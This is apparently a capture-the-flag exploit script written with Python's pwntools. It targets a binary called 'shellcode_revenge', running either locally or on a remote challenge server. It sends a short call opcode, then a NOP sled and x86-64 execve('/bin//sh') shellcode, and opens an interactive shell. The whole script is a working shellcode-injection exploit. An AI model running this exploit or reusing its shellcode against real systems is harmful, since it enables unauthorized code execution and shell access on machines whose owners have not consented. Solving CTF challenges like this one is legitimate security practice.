#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './shellcode_revenge'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2112

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

r.send(b'\xe8\xe7\xf5\xdf\xff')
r.send(b"\x90"*0x10 + b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05")
r.interactive()
